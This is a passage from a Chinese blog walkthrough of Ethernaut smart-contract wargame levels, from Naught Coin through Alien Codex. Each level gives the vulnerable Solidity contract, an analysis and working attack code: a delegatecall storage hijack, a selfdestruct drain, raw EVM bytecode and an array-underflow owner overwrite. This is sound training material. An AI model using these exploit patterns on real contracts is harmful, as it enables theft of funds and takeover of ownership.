//当使用super时，调用的是继承的该函数，不是它自己，比如下边给出的例子中，函数名字是相同的，要知道调用的不是它自己，是继承父合约中的同名函数。</span><br><span class="line">       super.f();</span><br><span class="line">     &#125;</span><br><span class="line">     function f2() &#123; // will set u to 2</span><br><span class="line">       B.f();</span><br><span class="line">     &#125;</span><br><span class="line">     function f3() &#123; // will set u to 1</span><br><span class="line">       C.f();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Attack-3"><a href="#Attack-3" class="headerlink" title="Attack"></a>Attack</h2><p>看了好久发现这道题好像不能使用合约进行攻击，因为授权操作都是以msg.sender作为owner，msg.sender只能是合约（使用合约攻击的情况下）。而要使balanceOf[tx.origin]为0就只能在题目环境下解题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">await contract.approve(player,toWei(&#x27;1000000&#x27;))//给自己授权</span><br><span class="line">await contract.transferFrom(player,&#x27;0x24fBFF0FbF51c62a64b4ED381C4E039E03dD2d6a&#x27;,toWei(&#x27;1000000&#x27;)//将授权的数量转走</span><br></pre></td></tr></table></figure>
+
+<h1 id="7-Preservation"><a href="#7-Preservation" class="headerlink" title="7.Preservation"></a>7.Preservation</h1><p>题目要求：This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.The goal of this level is for you to claim ownership of the instance you are given.</p>
+<p> Things that might help</p>
+<ul>
+<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
+<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>
+<li>Understanding how storage variables are stored and accessed.</li>
+<li>Understanding how casting works between different data types.</li>
+</ul>
+<h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;//使用delegatecall调用setTime储存为storedTime，storedTime占用slot0，delegatecall进行带哦用之后执行环境为攻击合约，所以该合约之下的slot0会被修改为传入的uint数据，即timeZone1Library可控</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-4"><a href="#Analyze-4" class="headerlink" title="Analyze"></a>Analyze</h2><p>学习过程参考<a name="13.Delegatecall">13.Delegatecall</a></p>
+<h2 id="Attzck"><a href="#Attzck" class="headerlink" title="Attzck"></a>Attzck</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">address a;</span><br><span class="line">address b;</span><br><span class="line">address owner;//将owner初始化在slot2，即可使修改的数据为被攻击合约的slot2</span><br><span class="line">Preservation target=Preservation(0x7ad5909C5ACde5A2a5B548280F980844e2564102);</span><br><span class="line">function changetimeZone1Library(uint a)public &#123;</span><br><span class="line">    target.setFirstTime(a);</span><br><span class="line">&#125;//第一次调用将timeZone1Library改变为攻击合约地址</span><br><span class="line">//再次调用则是调用攻击合约地址下的setTime(uint256)，此时即可执行攻击代码</span><br><span class="line">function setTime(uint256 a) public&#123;</span><br><span class="line">     owner=tx.origin;</span><br><span class="line">&#125;//折磨了好久又是oog，果然存在call就要注意gas限制的问题</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="8-Recovery"><a href="#8-Recovery" class="headerlink" title="8.Recovery"></a>8.Recovery</h1><p>题目要求：A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.5</code> ether to obtain more tokens. They have since lost the contract address.This level will be completed if you can recover (or remove) the <code>0.5</code> ether from the lost contract address.</p>
+<h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  //generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  // public variables</span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(10);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-5"><a href="#Analyze-5" class="headerlink" title="Analyze"></a>Analyze</h2><p>题目说creator在进行部署合约后进行了合约交互创建了SimpleToken合约并转入了0.5eth，但SimpleToken合约地址丢失,但是这些操作是在实例地址下进行的，打开区块链浏览器后查询实例地址并结合题目要求分析实例下的交易</p>
+<p>①获得实例地址</p>
+<p><img src="http://www.lzhnb.site/png/17.png" alt="image-20220128152722302"></p>
+<p>②查看进行过的交易并进行分析</p>
+<p><img src="http://www.lzhnb.site/png/25.png" alt="image-20220128153412528"></p>
+<ol>
+<li>结合题目可知关卡地址为0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2，所以操作一是我们单机创建新实例产生的交易</li>
+<li>题目说creator进行了对generateToken的调用创建了一个SimpleToken合约，所以操作二是creator调用函数进行合约交互</li>
+<li>题目说creator进行了对generateToken的调用创建了一个SimpleToken合约，所以操作三是创建了SimpleToken合约(0xFc777940566cE74f839101ba1842be4B6f69EDC2)</li>
+<li>所以creator是想这个合约转账了0.5eth，该合约下又有public的selfdestruct函数destroy，所以直接构建攻击合约调用destroy函数即可</li>
+</ol>
+<p><img src="http://www.lzhnb.site/png/2.png" alt="image-20220128153936825"></p>
+<h2 id="Attack-4"><a href="#Attack-4" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"> function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    SimpleToken target = SimpleToken(0xFc777940566cE74f839101ba1842be4B6f69EDC2);</span><br><span class="line">    function pwn(address payable to)public &#123;</span><br><span class="line">        target.destroy(to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="9-MagicNumber"><a href="#9-MagicNumber" class="headerlink" title="9.MagicNumber"></a>9.MagicNumber</h1><p>题目要求：To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.Easy right? Well… there’s a catch.The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.Good luck!</p>
+<h2 id="Code-7"><a href="#Code-7" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-6"><a href="#Analyze-6" class="headerlink" title="Analyze"></a>Analyze</h2><p><a target="_blank" rel="noopener" href="https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2">学习链接①</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">学习链接②</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-i-introduction-832efd2d7737/">学习链接③</a></p>
+<p>构建data：</p>
+<p>首先，42这个数字来的太不轻松了！！！</p>
+<p><img src="http://www.lzhnb.site/png/4.png" alt="image-20220129164545201"></p>
+<p><img src="http://www.lzhnb.site/png/16.png" alt="image-20220129164612660"></p>
+<p>①先构建runtime codes：0x60 0x2a 0x60 0x80 0x52 0x60 0x20 0x60 0x80 0xf3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">0x602a     ;PUSH1 0x2a                  v</span><br><span class="line">0x6080     ;PUSH1 0x80                  p</span><br><span class="line">0x52       ;MSTORE</span><br><span class="line">&#125;//mstore(p, v) p代表position位置，v代表value值</span><br><span class="line">&#123;</span><br><span class="line">0x6020     ;PUSH1 0x20                  s</span><br><span class="line">0x6080     ;PUSH1 0x80                  p</span><br><span class="line">0xf3       ;RETURN</span><br><span class="line">&#125;//return(p,s)p代表position位置，s代表size存储所占大小</span><br><span class="line">所以runtime codes：602a60805260206080f3</span><br></pre></td></tr></table></figure>
+
+<p>②构建initialization codes：0x60 0x0a 0x60 0x?? 0x60 0x00 0x39 0x60 0x0a 0x60 0x00 0xf3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">copy code&#123;</span><br><span class="line">0x600a     ;PUSH1 0x0a                     S(runtime code size)</span><br><span class="line">0x60??     ;PUSH1 0x??                     F(current position of runtime opcodes)</span><br><span class="line">0x6000     ;PUSH1 0x00                     T(destination memory index 0)</span><br><span class="line">0x39       ;CODECOPY</span><br><span class="line">&#125;//codecopy(t, f, s)t代表target目标位置，f代表runtime codes位置，s代表size代码大小</span><br><span class="line">return code&#123;</span><br><span class="line">0x600a     ;PUSH1 0x0a                     S</span><br><span class="line">0x6000     ;PUSH1 0x00                     P</span><br><span class="line">0xf3       ;RETURN</span><br><span class="line">&#125;//return(p,s)p代表position位置，s代表size存储所占大小</span><br><span class="line">initialization codes占用了12个字节，所以??应该是0c</span><br><span class="line">所以initialization codes：600a600c600039600a6000f3</span><br></pre></td></tr></table></figure>
+
+<p>③得到data：600a600c60&#x3D;&#x3D;00&#x3D;&#x3D;39600a60&#x3D;&#x3D;00&#x3D;&#x3D;f3602a60&#x3D;&#x3D;80&#x3D;&#x3D;52602060&#x3D;&#x3D;80&#x3D;&#x3D;f3(高亮部分非唯一答案，比如600a600c60&#x3D;&#x3D;10&#x3D;&#x3D;39600a60&#x3D;&#x3D;10&#x3D;&#x3D;f3602a60&#x3D;&#x3D;70&#x3D;&#x3D;52602060&#x3D;&#x3D;70&#x3D;&#x3D;f3)</p>
+<h2 id="Attack-5"><a href="#Attack-5" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">await sendTransaction(&#123;from:player,data:600a600c601039600a6010f3602a60705260206070f3&#125;)</span><br><span class="line"> //创建合约根据交易哈希获得合约地址</span><br><span class="line"> contract attack&#123;</span><br><span class="line">      MagicNum target=MagicNum(0x397175529CC088e12C7bb281403F2a15aDD6c9a5);</span><br><span class="line">      function pwn(address a)public&#123;</span><br><span class="line">          target.setSolver(a);</span><br><span class="line">      &#125;//传入刚刚创建的地址，进行调用</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="10-Alien-Codex"><a href="#10-Alien-Codex" class="headerlink" title="10.Alien Codex"></a>10.Alien Codex</h1><h2 id="Code-8"><a href="#Code-8" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function make_contact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-7"><a href="#Analyze-7" class="headerlink" title="Analyze"></a>Analyze</h2><p>这一关利用了 EVM 不会验证一个数组的 ABI-encoded 长度和他真实的payload的问题.</p>
+<p>并且他利用了数组长度的算数下溢, 通过扩大数组到整个 <code>2^256</code> 的存储区域. 然后用户就可以更改所有合约的storage了.</p>
+<p>这两个漏洞都是受这个启发 <a target="_blank" rel="noopener" href="https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079">Underhanded coding contest</a></p>
+<h2 id="Attack-6"><a href="#Attack-6" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface AlienCodex &#123;</span><br><span class="line"></span><br><span class="line">  function make_contact() external ;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) external ;</span><br><span class="line"></span><br><span class="line">  function retract()  external ;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Feng &#123;</span><br><span class="line">    AlienCodex target = AlienCodex(0x53c5A404b93e96DA6b913c222b728E8825f987E5);</span><br><span class="line">    bytes32 public payload = 0x000000000000000000000002b2E23ceC9921288f63F60A839E2B28235bc22ad;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.make_contact();</span><br><span class="line">        target.retract();</span><br><span class="line">        uint i = 2**256 - 1 - uint(keccak256(abi.encodePacked(uint(1)))) +1;</span><br><span class="line">        target.revise(i, payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时codex.length为2**256-1，map[x]的存储地址为keccak256(slot(codex)),此处slot(map)为1，map[x]存储地址为keccak256(slot(codex))+x,所以构造x为 2^256-keccak256(1),存储其值为1，即可覆盖slot(0)中的bool.</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>bcYng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/03/19/ethernaut%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E4%B8%8B/" title="Ethernaut靶场刷题part2&#x2F;3">http://example.com/2022/03/19/ethernaut靶场刷题下/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag"># 区块链</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/19/ethernaut%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E4%B8%8A/" rel="prev" title="Ethernaut靶场刷题part1/3">
+      <i class="fa fa-chevron-left"></i> Ethernaut靶场刷题part1/3
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Elevator"><span class="nav-number">1.</span> <span class="nav-text">1.Elevator</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code"><span class="nav-number">1.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze"><span class="nav-number">1.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack"><span class="nav-number">1.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-Privacy"><span class="nav-number">2.</span> <span class="nav-text">2.Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-1"><span class="nav-number">2.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-1"><span class="nav-number">2.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-Gatekeeper-One"><span class="nav-number">3.</span> <span class="nav-text">3.Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-2"><span class="nav-number">3.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#analyze"><span class="nav-number">3.2.</span> <span class="nav-text">analyze</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-Gatekeeper-Two"><span class="nav-number">4.</span> <span class="nav-text">4.Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-3"><span class="nav-number">4.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-2"><span class="nav-number">4.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-2"><span class="nav-number">4.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-Naught-Coin"><span class="nav-number">5.</span> <span class="nav-text">5.Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-4"><span class="nav-number">5.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-3"><span class="nav-number">5.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-3"><span class="nav-number">5.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-Preservation"><span class="nav-number">6.</span> <span class="nav-text">7.Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-5"><span class="nav-number">6.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-4"><span class="nav-number">6.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attzck"><span class="nav-number">6.3.</span> <span class="nav-text">Attzck</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-Recovery"><span class="nav-number">7.</span> <span class="nav-text">8.Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-6"><span class="nav-number">7.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-5"><span class="nav-number">7.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-4"><span class="nav-number">7.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9-MagicNumber"><span class="nav-number">8.</span> <span class="nav-text">9.MagicNumber</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-7"><span class="nav-number">8.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-6"><span class="nav-number">8.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-5"><span class="nav-number">8.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10-Alien-Codex"><span class="nav-number">9.</span> <span class="nav-text">10.Alien Codex</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-8"><span class="nav-number">9.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-7"><span class="nav-number">9.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-6"><span class="nav-number">9.3.</span> <span class="nav-text">Attack</span></a></li></ol></li></ol></div>
+      </div>
